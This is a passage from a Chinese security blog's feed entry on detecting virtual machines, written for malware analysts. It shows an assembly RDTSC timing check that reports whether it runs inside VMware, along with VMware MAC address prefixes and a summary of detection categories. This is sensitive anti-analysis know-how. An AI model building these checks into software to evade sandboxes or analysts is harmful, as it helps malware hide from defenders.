&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;.586p&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.model flat, stdcall&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;option casemap:none&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;include     windows.inc&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;include       kernel32.inc&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;include     user32.inc&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;includelib    kernel32.lib&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;includelib    user32.lib&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                        &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.data&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;szTitle     db  &amp;quot;VMDetect With RDTSC&amp;quot;, 0h&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;szInsideVM    db  &amp;quot;Inside VMware!&amp;quot;, 0h&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;szOutsideVM   db  &amp;quot;Native OS!&amp;quot;, 0h&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.code&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;start:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        RDTSC&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        xchg    ecx, eax&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        RDTSC &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        sub   eax, ecx&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        cmp   eax, 0FFh&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        jg    Detected&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        invoke  MessageBox, 0, offset szOutsideVM, offset szTitle, 0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        ret&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Detected:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        invoke  MessageBox, 0, offset szInsideVM, offset szTitle, 0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        ret&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;end start&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;测试结果如图8所示：&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/vmcheck/8.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;              图8&lt;br&gt;&lt;/center&gt;

&lt;h3 id=&quot;方法七：利用虚拟硬件指纹检测虚拟机&quot;&gt;&lt;a href=&quot;#方法七：利用虚拟硬件指纹检测虚拟机&quot; class=&quot;headerlink&quot; title=&quot;方法七：利用虚拟硬件指纹检测虚拟机&quot;&gt;&lt;/a&gt;方法七：利用虚拟硬件指纹检测虚拟机&lt;/h3&gt;&lt;p&gt;利用虚拟硬件指纹也可用于检测虚拟机的存在，比如VMware默认的网卡MAC地址前缀为“00-05-69，00-0C-29或者00-50-56”，这前3节是由VMware分配的唯一标识符OUI，以供它的虚拟化适配器使用。在我的VMWare WinXP下的MAC地址为00-0C-29-5B-D7-67，如图9所示：&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/media/vmcheck/9.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;                                 图9&lt;br&gt;&lt;/center&gt;

&lt;p&gt;但由于这些可经过修改配置文件来绕过检测。另外，还可通过检测特定的硬件控制器，BIOS，USB控制器，显卡，网卡等特征字符串进行检测，这些在前面使用注册表检测方法中已有所涉及。另外之前在看雪论坛上也有朋友提到通过检测硬盘Model Number是否含有“vmware”或“virtual”等字样来实现检测虚拟机的功能，网址见这（附源码）：&lt;a href=&quot;http://bbs.pediy.com/showthread.php?t=110046。&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://bbs.pediy.com/showthread.php?t=110046。&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;总结&quot;&gt;&lt;a href=&quot;#总结&quot; class=&quot;headerlink&quot; title=&quot;总结&quot;&gt;&lt;/a&gt;总结&lt;/h3&gt;&lt;p&gt;国外SANS安全组织的研究人员总结出当前各种虚拟机检测手段不外乎以下四类：&lt;/p&gt;
&lt;p&gt;● 搜索虚拟环境中的进程，文件系统，注册表；&lt;br&gt;● 搜索虚拟环境中的内存&lt;br&gt;● 搜索虚拟环境中的特定虚拟硬件&lt;br&gt;● 搜索虚拟环境中的特定处理器指令和功能&lt;/p&gt;
&lt;p&gt;因为现代计算系统大多是由文件系统，内存，处理器及各种硬件组件构成的，上面提到的四种检测手段均包含了这些因素。纵观前面各种检测方法，也均在此四类当中。除此之外，也有人提出通过网络来检测虚拟机，比如搜索ICMP和TCP数据通讯的时间差异，IP ID数据包差异以及数据包中的异常头信息等等。随着技术研究的深入，相信会有更多的检测手段出现，与此同时，虚拟机厂商也会不断进化它们的产品，以增加anti-vmware的难度，这不也正是一场永无休止的无烟战争！&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;在当今信息安全领域，特别是恶意软件分析中，经常需要利用到虚拟机技术，以提高病毒分析过程的安全性以及硬件资源的节约性，因此它在恶意软件领域中是
    
    </summary>
    
    
      <category term="虚拟机" scheme="http://riusksk.github.io/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA/"/>
    
  </entry>
  
</feed>
